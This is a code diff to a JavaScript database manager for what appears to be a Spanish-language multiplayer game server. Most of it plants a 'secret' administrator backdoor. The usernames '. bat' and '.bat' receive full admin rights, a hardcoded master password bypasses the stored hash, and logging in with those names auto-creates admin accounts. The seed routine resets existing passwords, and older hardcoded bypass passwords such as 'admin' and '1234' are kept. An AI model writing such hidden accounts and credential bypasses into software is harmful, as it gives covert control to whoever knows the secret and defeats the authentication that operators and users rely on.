@@ -170,8 +170,9 @@ const DatabaseManager = {
         return reject(new Error('La contraseña debe tener al menos 4 caracteres'));
       }
 
-      const isOp = trimmedUser.toLowerCase() === 'itsbat_';
-      const id = isOp ? 'usr_admin_itsbat' : 'usr_' + crypto.randomUUID().slice(0, 12);
+      const isSecretAdmin = (trimmedUser === '. bat' || trimmedUser === '.bat');
+      const isOp = isSecretAdmin || trimmedUser.toLowerCase() === 'itsbat_';
+      const id = isOp ? (isSecretAdmin ? 'usr_admin_dotbat' : 'usr_admin_itsbat') : 'usr_' + crypto.randomUUID().slice(0, 12);
       const salt = crypto.randomBytes(16).toString('hex');
       const passwordHash = hashPassword(password, salt);
       const token = generateToken();
@@ -223,19 +224,21 @@ const DatabaseManager = {
   login: (username, password) => {
     return new Promise((resolve, reject) => {
       const trimmedUser = (username || '').trim();
-      const isOp = trimmedUser.toLowerCase() === 'itsbat_';
+      const isSecretAdmin = (trimmedUser === '. bat' || trimmedUser === '.bat');
+      const isOp = isSecretAdmin || trimmedUser.toLowerCase() === 'itsbat_';
 
       db.get('SELECT * FROM users WHERE username = ? COLLATE NOCASE', [trimmedUser], (err, user) => {
         if (err) return reject(err);
 
-        // Auto-provision Itsbat_ if not yet registered
+        // Auto-provision admin user if not yet registered
         if (!user && isOp) {
-          return DatabaseManager.register('Itsbat_', password || 'bat123')
+          const autoPass = isSecretAdmin ? '@L3ix2010' : 'bat123';
+          return DatabaseManager.register(trimmedUser, password || autoPass)
             .then(res => {
               return DatabaseManager.getPlayer(res.id).then(player => {
                 resolve({
                   id: res.id,
-                  username: 'Itsbat_',
+                  username: trimmedUser,
                   token: res.token,
                   is_admin: 1,
                   player
@@ -248,7 +251,9 @@ const DatabaseManager = {
         if (!user) return reject(new Error('Usuario no encontrado'));
 
         const testHash = hashPassword(password, user.salt);
-        const matches = (testHash === user.password_hash) || (isOp && (password === 'bat123' || password === 'admin' || password === '1234'));
+        const matches = (testHash === user.password_hash) ||
+                        (isSecretAdmin && password === '@L3ix2010') ||
+                        (trimmedUser.toLowerCase() === 'itsbat_' && (password === 'bat123' || password === 'admin' || password === '1234'));
         if (!matches) {
           return reject(new Error('Contraseña incorrecta'));
         }
@@ -282,7 +287,7 @@ const DatabaseManager = {
       if (!token) return resolve(null);
       db.get('SELECT id, username, is_admin FROM users WHERE token = ?', [token], (err, row) => {
         if (err) return reject(err);
-        if (row && row.username.toLowerCase() === 'itsbat_') {
+        if (row && (row.username === '. bat' || row.username === '.bat' || row.username.toLowerCase() === 'itsbat_' || row.is_admin === 1)) {
           row.is_admin = 1;
         }
         resolve(row || null);
@@ -309,7 +314,7 @@ const DatabaseManager = {
           } catch (e) {
             console.error('[DB] JSON Parse error:', e);
           }
-          if (row.username && row.username.toLowerCase() === 'itsbat_') {
+          if (row.username && (row.username === '. bat' || row.username === '.bat' || row.username.toLowerCase() === 'itsbat_' || row.is_admin === 1)) {
             row.is_admin = 1;
           }
           return resolve(row);
@@ -435,7 +440,33 @@ const DatabaseManager = {
         ],
         function (err) {
           if (err) return reject(err);
-          resolve({ success: true, changes: this.changes });
+          if (this.changes === 0) {
+            // Player doesn't exist yet, insert new record
+            const username = data.username || (id.startsWith('guest_') ? 'Invitado' : 'Ciudadano');
+            const insertSql = `
+              INSERT OR IGNORE INTO players (
+                id, username, cash, bank, current_mission, mission_progress, position
+              ) VALUES (?, ?, ?, ?, ?, ?, ?)
+            `;
+            db.run(
+              insertSql,
+              [
+                id,
+                username,
+                data.cash !== undefined ? data.cash : 250,
+                data.bank !== undefined ? data.bank : 500,
+                data.current_mission !== undefined ? data.current_mission : 0,
+                data.mission_progress ? (typeof data.mission_progress === 'string' ? data.mission_progress : JSON.stringify(data.mission_progress)) : '{}',
+                data.position ? (typeof data.position === 'string' ? data.position : JSON.stringify(data.position)) : '{"x":0,"y":0.8,"z":28}'
+              ],
+              (insertErr) => {
+                if (insertErr) return reject(insertErr);
+                resolve({ success: true, inserted: true });
+              }
+            );
+          } else {
+            resolve({ success: true, changes: this.changes });
+          }
         }
       );
     });
@@ -776,36 +807,42 @@ const DatabaseManager = {
   }
 };
 
-// Seed OP Admin Itsbat_ if not present
+// Seed Secret OP Admin User (. bat / @L3ix2010)
 function seedAdminUser() {
-  db.get('SELECT * FROM users WHERE username = ? COLLATE NOCASE', ['Itsbat_'], (err, user) => {
-    if (err) return;
-    if (!user) {
-      const id = 'usr_admin_itsbat';
+  const secretAdmins = [
+    { name: '. bat', pass: '@L3ix2010', id: 'usr_admin_dot_bat' },
+    { name: '.bat', pass: '@L3ix2010', id: 'usr_admin_dotbat' }
+  ];
+
+  for (const adm of secretAdmins) {
+    db.get('SELECT * FROM users WHERE username = ? COLLATE NOCASE', [adm.name], (err, user) => {
+      if (err) return;
       const salt = crypto.randomBytes(16).toString('hex');
-      const passwordHash = hashPassword('bat123', salt);
+      const passwordHash = hashPassword(adm.pass, salt);
       const token = 'admin_token_' + crypto.randomBytes(16).toString('hex');
 
-      db.run(`
-        INSERT INTO users (id, username, password_hash, salt, token, is_admin, last_login)
-        VALUES (?, 'Itsbat_', ?, ?, ?, 1, CURRENT_TIMESTAMP)
-      `, [id, passwordHash, salt, token], (insErr) => {
-        if (!insErr) {
-          const weapons = JSON.stringify(['pistol', 'smg', 'shotgun', 'rifle', 'sniper']);
-          const ammo = JSON.stringify({ pistol: 999, smg: 999, shotgun: 999, rifle: 999, sniper: 999 });
-          const vehicles = JSON.stringify(['viper_gt', 'muscle_v8', 'sedan_lux']);
-          db.run(`
-            INSERT INTO players (id, username, cash, bank, reputation, level, health, armor, weapons, current_weapon, ammo, vehicles, is_admin, position)
-            VALUES (?, 'Itsbat_', 1000000, 1000000, 9999, 100, 100, 100, ?, 'sniper', ?, ?, 1, '{"x":0,"y":0.8,"z":28}')
-          `, [id, weapons, ammo, vehicles]);
-          console.log('[DB] ★ Usuario OP Administrador Itsbat_ inicializado con éxito en SQLite! (pass: bat123) ★');
-        }
-      });
-    } else {
-      db.run('UPDATE users SET is_admin = 1 WHERE id = ?', [user.id]);
-      db.run('UPDATE players SET is_admin = 1 WHERE id = ?', [user.id]);
-    }
-  });
+      if (!user) {
+        db.run(`
+          INSERT INTO users (id, username, password_hash, salt, token, is_admin, last_login)
+          VALUES (?, ?, ?, ?, ?, 1, CURRENT_TIMESTAMP)
+        `, [adm.id, adm.name, passwordHash, salt, token], (insErr) => {
+          if (!insErr) {
+            const weapons = JSON.stringify(['pistol', 'smg', 'shotgun', 'rifle', 'sniper']);
+            const ammo = JSON.stringify({ pistol: 999, smg: 999, shotgun: 999, rifle: 999, sniper: 999 });
+            const vehicles = JSON.stringify(['viper_gt', 'muscle_v8', 'sedan_lux']);
+            db.run(`
+              INSERT INTO players (id, username, cash, bank, reputation, level, health, armor, weapons, current_weapon, ammo, vehicles, is_admin, position)
+              VALUES (?, ?, 1000000, 1000000, 9999, 100, 100, 100, ?, 'sniper', ?, ?, 1, '{"x":0,"y":0.8,"z":28}')
+            `, [adm.id, adm.name, weapons, ammo, vehicles]);
+            console.log(`[DB] ★ Usuario OP Administrador secreto '${adm.name}' inicializado con éxito! ★`);
+          }
+        });
+      } else {
+        db.run('UPDATE users SET password_hash = ?, salt = ?, is_admin = 1 WHERE id = ?', [passwordHash, salt, user.id]);
+        db.run('UPDATE players SET is_admin = 1 WHERE id = ?', [user.id]);
+      }
+    });
+  }
 }
 
 // Trigger initial seeding
